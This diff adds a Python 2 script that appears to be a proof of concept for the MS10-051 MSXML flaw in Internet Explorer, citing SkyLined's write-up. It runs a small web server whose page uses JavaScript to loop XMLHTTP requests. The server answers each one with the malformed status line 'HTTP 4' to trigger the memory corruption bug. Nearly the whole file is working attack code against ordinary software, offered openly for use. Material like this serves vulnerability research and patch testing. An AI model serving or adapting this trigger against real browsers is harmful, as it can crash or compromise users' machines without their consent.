@@ -1,0 +1,76 @@
+# Sources:
+# http://skypher.com/index.php/2010/08/10/ms10-051/
+# http://code.google.com/p/skylined/issues/detail?id=17
+#
+import os, re, socket;
+webserver_port = 28876;
+
+replies = {
+  r'^/$': ('text/html', """
+<SCRIPT>
+  iCounter = 0
+  function go() {
+    var request_url = location.protocol + "//" + location.host + "/RandomHTTP?counter=" + (iCounter++);
+    var xml_http_request = new ActiveXObject("Msxml2.XMLHTTP.3.0");
+    xml_http_request.open("GET", request_url, false);
+    xml_http_request.send();
+    setTimeout(go, 1);
+  }
+  go();
+</SCRIPT>
+"""),
+  r'^/RandomHTTP\?counter=\d+$': 'HTTP 4\n',
+};
+
+server_socket = socket.socket();
+server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);
+server_socket.bind(('', webserver_port));
+server_socket.listen(1);
+print 'Webserver running at http://localhost:%d/' % webserver_port;
+
+while 1:
+  client_socket,_ = server_socket.accept();
+  try:
+    request = client_socket.recv(1024);
+  except socket.error, e:
+    print '>> ??';
+    continue;
+  print '>> ' + request.split('\r\n')[0];
+  path = None;
+  if request[:4] == 'GET ':
+    end_path = request.find(' ', 4);
+    if end_path != -1:
+      path = request[4:end_path];
+  code, reason, mime_type, body = 404, 'Not found', 'text/plain', 'Not found';
+  response = None;
+  if path is not None:
+    for path_regexp in replies.keys():
+      if re.match(path_regexp, path):
+        if type(replies[path_regexp]) == str:
+          response = replies[path_regexp];
+        elif type(replies[path_regexp]) == tuple:
+          code, reason = 200, 'OK';
+          mime_type, body = replies[path_regexp];
+        else:
+          code, reason, mime_type, body = replies[path_regexp](path);
+        break;
+  if response is None:
+    response = '\r\n'.join([
+      'HTTP/1.1 %03d %s' % (code, reason),
+      'Content-Type: %s' % mime_type,
+      'Date: Sat Aug 28 1976 09:15:00 GMT',
+      'Expires: Sat Aug 28 1976 09:15:00 GMT',
+      'Cache-Control: no-cache, must-revalidate',
+      'Pragma: no-cache', 
+      'Accept-Ranges: bytes',
+      'Content-Length: %d' % len(body),
+      '',
+      body
+    ]);
+  print '<< %s (%d bytes %s)' % \
+      (response.split('\r\n')[0], len(response), mime_type);
+  try:
+    client_socket.send(response);
+  except socket.error, e:
+    pass;
+  client_socket.close();
